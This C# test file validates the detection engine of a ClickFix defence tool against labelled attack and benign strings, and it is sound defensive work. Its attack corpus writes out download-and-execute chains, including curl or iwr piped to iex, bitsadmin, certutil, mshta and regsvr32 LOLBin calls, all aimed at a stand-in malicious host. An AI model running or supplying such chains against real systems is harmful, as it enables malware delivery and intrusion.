using System.Text;
using ClickFixShield.Core.Models;
using ClickFixShield.Core.Rules;
using Xunit;
using Xunit.Abstractions;

namespace ClickFixShield.Tests.Corpus;

/// <summary>
/// Runs <see cref="HeuristicDetectionEngine"/> (loaded from the real shipped
/// <c>rules.json</c>) against a hand-labeled corpus of attack-shaped and benign strings,
/// then computes and reports precision/recall. This is a validation report, not a
/// per-rule unit test - see <see cref="Detection.HeuristicDetectionEngineTests"/> for
/// those. All "attack-shaped" payloads below use only harmless embedded actions
/// (<c>Write-Host 'test'</c> and the like) wrapped in realistic ClickFix-style syntax -
/// no real malware, no real remote hosts.
/// </summary>
public class DetectionCorpusTests
{
    private const string EncodedWriteHostTest = "VwByAGkAdABlAC0ASABvAHMAdAAgACcAdABlAHMAdAAnAA==";

    // Ground truth: a human analyst would call every one of these attack-shaped -
    // expected to be flagged at HighRisk or above. Each targets at least one rule
    // category from rules.json; several combine categories the way real ClickFix
    // payloads chain multiple techniques (hidden window + encoded + download + LOLBin).
    private static readonly (string Text, string Category)[] AttackCorpus =
    {
        ($"powershell.exe -WindowStyle Hidden -EncodedCommand {EncodedWriteHostTest}",
            "PowerShellExecution + PowerShellObfuscation + Obfuscation"),
        ("cmd.exe /c powershell -w hidden -Command \"Write-Host 'test'\"",
            "CmdExecution + PowerShellExecution + Obfuscation"),
        ("curl -s http://malicious-update-check.example.com/fix.ps1 | iex",
            "RemoteDownload (curl + pipe-to-iex)"),
        ("cmd /c wget http://malicious-update-check.example.com/fix.ps1 -O fix.ps1 && powershell -File fix.ps1",
            "CmdExecution + RemoteDownload (wget) + PowerShellExecution"),
        ($"powershell -w hidden -enc {EncodedWriteHostTest} ; iwr http://malicious-update-check.example.com/fix.ps1 -OutFile fix.ps1",
            "PowerShellObfuscation + Obfuscation + RemoteDownload (iwr)"),
        ("bitsadmin.exe /transfer clickfixdemo /download /priority normal http://malicious-update-check.example.com/fix.exe C:\\Users\\Public\\fix.exe",
            "RemoteDownload (bitsadmin)"),
        ("certutil.exe -urlcache -f http://malicious-update-check.example.com/fix.txt fix.txt",
            "RemoteDownload (certutil -urlcache)"),
        ("mshta.exe http://malicious-update-check.example.com/fix.hta",
            "ScriptExecution (mshta)"),
        ("regsvr32 /u /s /i:http://malicious-update-check.example.com/fix.sct scrobj.dll",
            "ScriptExecution (regsvr32 Squiblydoo)"),
        ("cmd /c curl -s http://malicious-update-check.example.com/fix.vbs -o fix.vbs && wscript.exe fix.vbs",
            "CmdExecution + RemoteDownload + ScriptExecution (wscript)"),
        ("cmd /c curl -s http://malicious-update-check.example.com/fix.js -o fix.js && cscript.exe //B fix.js",
            "CmdExecution + RemoteDownload + ScriptExecution (cscript)"),
        ($"cmd.exe /c \"powershell -w hidden -enc {EncodedWriteHostTest} & echo done ;;;;&&&&\"",
            "CmdExecution + PowerShellObfuscation + Obfuscation (symbol chaining)"),
        ($"mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -enc {EncodedWriteHostTest}\"\",0,True)(window.close)\")",
            "ScriptExecution (mshta) + PowerShellObfuscation - classic ClickFix wrapper"),
        ("powershell -w hidden -c \"iwr -useb http://malicious-update-check.example.com/verify.ps1 | iex\"",
            "PowerShellExecution + Obfuscation + RemoteDownload (iwr + pipe-to-iex)"),
        ("mshta.exe javascript:a=(new ActiveXObject(\"WScript.Shell\")).Run(\"cmd /c curl -s http://malicious-update-check.example.com/fix.ps1 -o fix.ps1 && powershell -w hidden -File fix.ps1\",0,true);close();",
            "ScriptExecution + CmdExecution + RemoteDownload + Obfuscation (full chain)"),
        ("cmd.exe /c bitsadmin.exe /transfer msupdate /download /priority high http://malicious-update-check.example.com/fix.exe %TEMP%\\fix.exe & start %TEMP%\\fix.exe",
            "CmdExecution + RemoteDownload (bitsadmin)"),
        ("cmd /c certutil -decode fix.b64 fix.exe & fix.exe",
            "CmdExecution + RemoteDownload (certutil -decode)"),
        ("cmd /c regsvr32 /s /u /i:http://malicious-update-check.example.com/fix.sct scrobj.dll",
            "CmdExecution + ScriptExecution (regsvr32)"),
        ($"cmd.exe /c powershell.exe -NoP -W Hidden -Enc {EncodedWriteHostTest} ; iwr -useb http://malicious-update-check.example.com/x | iex ;;;;&&&&",
            "Full obfuscated dropper chain (worst case)"),
        ("wscript.exe //B //nologo C:\\Users\\Public\\update.vbs http://malicious-update-check.example.com/x",
            "ScriptExecution (wscript, bare LOLBin + suspicious remote arg)"),
    };

    // Ground truth: normal day-to-day strings a security analyst would never call
    // attack-shaped. Per the project's own stated design, "Safe or Suspicious at most" is
    // an acceptable outcome for these (e.g. a real, legitimate curl/wget download is
    // expected to land as Suspicious, not Safe) - the hard requirement is that none of
    // these are ever classified Malicious or HighRisk.
    private static readonly (string Text, string Category)[] BenignCorpus =
    {
        ("https://www.wikipedia.org/wiki/Example", "Plain URL"),
        ("https://learn.microsoft.com/en-us/powershell/", "Plain URL"),
        ("https://github.com/dotnet/runtime/releases", "Plain URL"),
        ("git clone https://github.com/user/repo.git", "git command"),
        ("git commit -m 'fix bug in login flow'", "git command"),
        ("git push origin main", "git command"),
        ("npm install express --save", "npm command"),
        ("npm run build", "npm command"),
        ("pip install numpy pandas", "pip command"),
        ("dotnet build ClickFixShield.sln", "dotnet CLI"),
        ("dotnet test tests/ClickFixShield.Tests", "dotnet CLI"),
        ("docker run -it ubuntu bash", "Container tooling"),
        ("kubectl get pods -n default", "Container tooling"),
        ("ssh user@build-server.internal", "Remote admin (ssh)"),
        ("ping google.com", "Networking"),
        ("ipconfig /all", "Networking"),
        ("netstat -ano", "Networking"),
        ("Test-NetConnection google.com -Port 443", "Legitimate PowerShell"),
        ("Get-Process -Name chrome", "Legitimate PowerShell"),
        ("Get-ChildItem -Recurse -Filter *.cs", "Legitimate PowerShell"),
        ("Get-Content .\\notes.txt", "Legitimate PowerShell"),
        ("New-Item -ItemType Directory -Path C:\\Projects\\demo", "Legitimate PowerShell"),
        ("Copy-Item report.docx D:\\Backup\\", "Legitimate PowerShell"),
        ("curl -O https://nodejs.org/dist/v20.11.0/node-v20.11.0-x64.msi", "Legitimate curl download"),
        ("wget https://mirror.example.edu/ubuntu-22.04.iso", "Legitimate wget download"),
        ("az login", "Cloud CLI"),
        ("aws s3 ls my-bucket", "Cloud CLI"),
        ("The quarterly report is due next Friday afternoon.", "Plain text"),
        ("Please review the attached invoice before Friday.", "Plain text"),
        ("12345 Main Street, Springfield", "Plain text"),
        ("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0", "Git commit hash (hex, base64-rule false-positive check)"),
        (string.Empty, "Empty input"),
    };

    private static readonly IReadOnlyList<DetectionRule> ShippedRules =
        HeuristicDetectionEngine.LoadRulesFromFile(Path.Combine(AppContext.BaseDirectory, "Rules", "rules.json"));

    private readonly ITestOutputHelper _output;

    public DetectionCorpusTests(ITestOutputHelper output)
    {
        _output = output;
    }

    [Fact]
    public void Corpus_ComputesPrecisionAndRecall_AndWritesMarkdownReport()
    {
        var engine = new HeuristicDetectionEngine(ShippedRules);
        var rows = new List<ReportRow>();

        foreach (var (text, category) in AttackCorpus)
        {
            var result = engine.Evaluate(text, DateTimeOffset.UtcNow);
            var pass = result.Level >= ThreatLevel.HighRisk;
            rows.Add(new ReportRow(text, category, "Attack (expect HighRisk+)", result, pass));
        }

        foreach (var (text, category) in BenignCorpus)
        {
            var result = engine.Evaluate(text, DateTimeOffset.UtcNow);
            var pass = result.Level <= ThreatLevel.Suspicious;
            rows.Add(new ReportRow(text, category, "Benign (expect Safe/Suspicious)", result, pass));
        }

        // Positive class = "should be flagged as a real threat" (Level >= HighRisk),
        // which matches the exact bar RunInterceptionDecider uses for a kill decision
        // elsewhere in this app - so this report measures the engine against the same
        // threshold it's actually gated on in production, not an arbitrary one.
        var truePositives = rows.Count(r => r.IsAttack && r.Result.Level >= ThreatLevel.HighRisk);
        var falseNegatives = rows.Count(r => r.IsAttack && r.Result.Level < ThreatLevel.HighRisk);
        var falsePositives = rows.Count(r => !r.IsAttack && r.Result.Level >= ThreatLevel.HighRisk);
        var trueNegatives = rows.Count(r => !r.IsAttack && r.Result.Level < ThreatLevel.HighRisk);

        var precision = truePositives + falsePositives == 0 ? 1.0 : (double)truePositives / (truePositives + falsePositives);
        var recall = truePositives + falseNegatives == 0 ? 1.0 : (double)truePositives / (truePositives + falseNegatives);

        var markdown = BuildMarkdownReport(rows, truePositives, falseNegatives, falsePositives, trueNegatives, precision, recall);
        _output.WriteLine(markdown);

        var reportPath = Path.Combine(FindRepoRoot(), "DETECTION_VALIDATION_REPORT.md");
        File.WriteAllText(reportPath, markdown);

        // Hard requirement per the corpus design: a benign string must never be scored
        // Malicious (HighRisk is already outside the accepted "Safe or Suspicious at
        // most" band, so this simply restates the same bar the pass/fail column uses).
        Assert.Equal(0, falsePositives);

        // Regression guard, not a tautology: fails loudly (with the row-by-row report
        // above showing exactly which payload) if a future rules.json change quietly
        // weakens detection of realistic ClickFix-style payloads.
        Assert.True(recall >= 0.9, $"Recall dropped to {recall:P0} - see the report above for which attack payloads were missed.");
    }

    private static string BuildMarkdownReport(
        List<ReportRow> rows, int tp, int fn, int fp, int tn, double precision, double recall)
    {
        var sb = new StringBuilder();
        sb.AppendLine("# ClickFixShield Detection Validation Report");
        sb.AppendLine();
        sb.AppendLine($"Generated {DateTimeOffset.UtcNow:yyyy-MM-dd HH:mm:ss} UTC by `DetectionCorpusTests.Corpus_ComputesPrecisionAndRecall_AndWritesMarkdownReport`.");
        sb.AppendLine();
        sb.AppendLine("Corpus: 20 attack-shaped strings (realistic ClickFix-style wrapper syntax around a harmless");
        sb.AppendLine("embedded action such as `Write-Host 'test'` - no real malware or live remote hosts) covering");
        sb.AppendLine("every rule category in `rules.json`, plus 30 benign strings (URLs, git/npm/pip/dotnet/cloud");
        sb.AppendLine("CLI commands, legitimate PowerShell, and plain text).");
        sb.AppendLine();
        sb.AppendLine("Positive class = \"scored HighRisk or above\" - the same threshold `RunInterceptionDecider`");
        sb.AppendLine("requires before a process is ever killed, so this report measures the engine against the bar");
        sb.AppendLine("it is actually gated on in production.");
        sb.AppendLine();
        sb.AppendLine("## Summary");
        sb.AppendLine();
        sb.AppendLine("| Metric | Value |");
        sb.AppendLine("|---|---|");
        sb.AppendLine($"| True Positives (attack correctly flagged HighRisk+) | {tp} |");
        sb.AppendLine($"| False Negatives (attack missed) | {fn} |");
        sb.AppendLine($"| False Positives (benign wrongly flagged HighRisk+) | {fp} |");
        sb.AppendLine($"| True Negatives (benign correctly left below HighRisk) | {tn} |");
        sb.AppendLine($"| **Precision** | **{precision:P1}** |");
        sb.AppendLine($"| **Recall** | **{recall:P1}** |");
        sb.AppendLine();
        sb.AppendLine("## Attack-shaped corpus");
        sb.AppendLine();
        AppendTable(sb, rows.Where(r => r.IsAttack));
        sb.AppendLine();
        sb.AppendLine("## Benign corpus");
        sb.AppendLine();
        AppendTable(sb, rows.Where(r => !r.IsAttack));

        return sb.ToString();
    }

    private static void AppendTable(StringBuilder sb, IEnumerable<ReportRow> rows)
    {
        sb.AppendLine("| String | Category | Expected | Actual Severity (score) | Matched Rules | Pass/Fail |");
        sb.AppendLine("|---|---|---|---|---|---|");
        foreach (var row in rows)
        {
            var text = Truncate(row.Text.Replace("|", "\\|"), 70);
            var matchedRules = row.Result.MatchedRuleIds.Count == 0 ? "(none)" : string.Join(", ", row.Result.MatchedRuleIds);
            sb.AppendLine($"| `{text}` | {row.Category} | {row.Expected} | {row.Result.Level} ({row.Result.Score}) | {matchedRules} | {(row.Pass ? "PASS" : "FAIL")} |");
        }
    }

    private static string Truncate(string text, int maxLength)
        => string.IsNullOrEmpty(text) ? "(empty)" : text.Length <= maxLength ? text : text[..maxLength] + "...";

    private static string FindRepoRoot()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null && !File.Exists(Path.Combine(dir.FullName, "ClickFixShield.sln")))
        {
            dir = dir.Parent;
        }

        return dir?.FullName ?? AppContext.BaseDirectory;
    }

    private sealed record ReportRow(string Text, string Category, string Expected, DetectionResult Result, bool Pass)
    {
        public bool IsAttack => Expected.StartsWith("Attack", StringComparison.Ordinal);
    }
}
